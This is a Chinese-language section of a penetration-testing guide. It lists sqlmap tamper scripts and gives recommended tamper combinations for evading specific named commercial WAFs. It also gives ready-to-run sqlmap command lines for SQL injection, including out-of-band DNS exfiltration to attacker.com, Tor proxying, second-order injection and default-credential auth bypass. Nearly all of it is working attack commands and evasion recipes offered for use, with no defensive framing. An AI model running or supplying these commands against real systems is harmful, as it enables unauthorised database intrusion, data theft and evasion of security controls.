## 五、sqlmap高级Tamper组合使用

### 5.1 标准Tamper分类与选型
| Tamper脚本 | 功能 | 适用场景 |
|-----------|------|---------|
| `space2comment` | 空格→/**/ | 通用弱WAF |
| `space2hash` | 空格→%23%0a（MySQL） | MySQL WAF |
| `space2mssqlblank` | 空格→随机空白（MSSQL） | MSSQL |
| `space2mysqlblank` | 空格→随机空白（MySQL） | MySQL |
| `space2randomblank` | 空格→随机空白 | 通用 |
| `randomcase` | 关键字随机大小写 | 大小写敏感过滤 |
| `between` | >/=→BETWEEN | 拦截比较符 |
| `equaltolike` | =→LIKE | 拦截等号 |
| `charencode` | 全URL编码 | URL层过滤 |
| `percentage` | 每个字符前加% | ASP/IIS |
| `chardoubleencode` | 双重URL编码 | 双层WAF |
| `charunicodeencode` | Unicode编码 | ASP/ASP.NET |
| `charunicodeescape` | Unicode转义 | 通用 |
| `appendnullbyte` | 末尾加%00 | Access截断 |
| `ifnull2ifisnull` | IFNULL→IF(ISNULL) | 过滤IFNULL |
| `modsecurityversioned` | MySQL版本注释包裹 | ModSecurity |
| `modsecurityzeroversioned` | /*!00000*/包裹 | ModSecurity |
| `versionedkeywords` | /*!...*/包裹关键字 | 通用MySQL WAF |
| `versionedmorekeywords` | 更多关键字版本注释 | 强MySQL WAF |
| `halfversionedmorekeywords` | 关键字前置版本注释 | 变种 |
| `bluecoat` | 空格→随机空白+随机注释 | BlueCoat WAF |
| `varnish` | 绕过Varnish缓存WAF | Varnish |
| `xforwardedfor` | 添加X-Forwarded-For头 | 基于IP白名单 |
| `informationschemacomment` | i_s加/**/注释 | 拦截i_s |
| `sleep2getlock` | SLEEP→GET_LOCK | 拦截SLEEP |
| `greatest/least` | >/<→GREATEST/LEAST | 拦截比较符 |
| `apostrophemask` | '→%EF%BC%87 | UTF-8全角撇号 |
| `apostrophenullencode` | '→%00%27 | 空字节撇号 |
| `overlongutf8/overlongutf8more` | UTF-8超长编码 | 超长编码绕过 |
| `concat2concatws` | CONCAT→CONCAT_WS | 拦截CONCAT |
| `substring2leftright` | SUBSTRING→LEFT/RIGHT | 拦截SUBSTRING |
| `0eunion` | UNION→e0UNION（e0科学计数法前缀） | 拦截UNION |
| `dunion/misunion` | UNION变体拼接 | 强UNION拦截 |
| `sp_password` | 追加sp_password日志绕过 | MSSQL日志屏蔽 |
| `plus2concat/plus2fnconcat` | +→CONCAT/|| | MSSQL拦截+ |
| `commalesslimit/commalessmid` | 无逗号LIMIT/MID | 拦截逗号 |
| `commentbeforeparentheses` | 括号前加注释 | 括号前拦截 |
| `ord2ascii` | ORD→ASCII | 拦截ORD |
| `symboliclogical` | AND/OR→&&/|| | 拦截AND/OR |
| `hex2char` | 0x→CHAR() | 拦截十六进制 |
| `if2casewhenisnull` | IF→CASE WHEN | 拦截IF |
| `unionalltounion` | UNION ALL→UNION | 拦截UNION ALL |
| `escapequotes` | '→\\' | 魔术引号 |
| `base64encode` | Base64编码 | 后端有解码 |
| `unmagicquotes` | 宽字节绕过魔术引号 | GBK+addslashes |
| `multiplespaces` | 单空格→多空格 | 单空格匹配 |
| `randomcomments` | 关键字内插随机注释 | 强关键字拦截 |
| `hexentities` | 十六进制→HTML实体 | HTML实体场景 |
| `htmlencode/decentities` | HTML编码/反实体 | HTML层过滤 |
| `binary` | 加BINARY关键字 | BINARY比较 |
| `schemasplit` | information_schema拆分 | i_s拆分拦截 |
| `scientific` | 数字→科学计数法 | 数字过滤 |
| `lowercase/uppercase` | 关键字大/小写统一 | 大小写混合 |
| `luanginx/luanginxmore` | 绕过LUA/Nginx WAF | Nginx+Lua WAF |
| `ifnull2casewhenisnull` | IFNULL→CASE WHEN IS NULL | 过滤IFNULL |

### 5.2 推荐Tamper组合（按WAF类型）
```bash
# 1. 基础WAF（阿里云/腾讯云基础版）
--tamper=space2comment,randomcase,between

# 2. 中等防护（ModSecurity/云WAF标准版）
--tamper=space2comment,randomcase,between,modsecurityversioned,charencode

# 3. 强防护（安全狗/D盾/云锁）
--tamper=space2comment,space2randomblank,randomcomments,randomcase,versionedmorekeywords,between,equaltolike,charencode

# 4. MySQL强WAF（阿里云企业版/长亭雷池）
--tamper=space2mysqlblank,randomcomments,versionedmorekeywords,halfversionedmorekeywords,if2casewhenisnull,sleep2getlock,between,greatest,concat2concatws,chardoubleencode

# 5. MSSQL强WAF
--tamper=space2mssqlblank,randomcase,randomcomments,percentage,charunicodeencode,equaltolike,appendnullbyte

# 6. Oracle
--tamper=space2comment,randomcase,between,commentbeforeparentheses,greatest,least

# 7. 宽字节（GBK场景）
--tamper=unmagicquotes,space2comment,randomcase

# 8. MSSQL蓝盾/BlueCoat
--tamper=bluecoat,space2mssqlhash,charunicodeencode

# 9. Varnish缓存WAF
--tamper=varnish,space2comment,randomcase

# 10. 分块编码绕过（配HTTP头）
--chunked  --tamper=randomcomments,space2comment
```

### 5.3 sqlmap高阶参数
```bash
# 基础扫描
sqlmap -u "http://target.com/page?id=1" --batch --random-agent

# WAF绕过全套
sqlmap -u "http://target/page?id=1" \
  --tamper=space2comment,randomcase,between,randomcomments \
  --random-agent --delay=1 --timeout=30 --retries=3 \
  --skip-waf --hpp --chunked --no-cast \
  --eval="import hashlib;id=hashlib.md5(id.encode()).hexdigest()"

# 分数据库指定
sqlmap -u "URL" --dbms=mysql --tech=BEUSTQ --level=5 --risk=3
sqlmap -u "URL" --dbms=mssql --tech=ES --os=Windows --banner
sqlmap -u "URL" --dbms=oracle --tech=BEUST --level=5

# DNS外带（--dns-domain需自己控制DNS服务器）
sqlmap -u "URL" --dns-domain=attacker.com --technique=T

# 二阶注入
sqlmap -u "second_order_url" --second-order="trigger_url" --second-req="request.txt"

# 代理多跳
--proxy="http://127.0.0.1:8080" --proxy-cred="user:pass" --tor --tor-port=9050 --tor-type=SOCKS5

# 绕过401认证
--auth-type=basic --auth-cred="admin:admin"
```

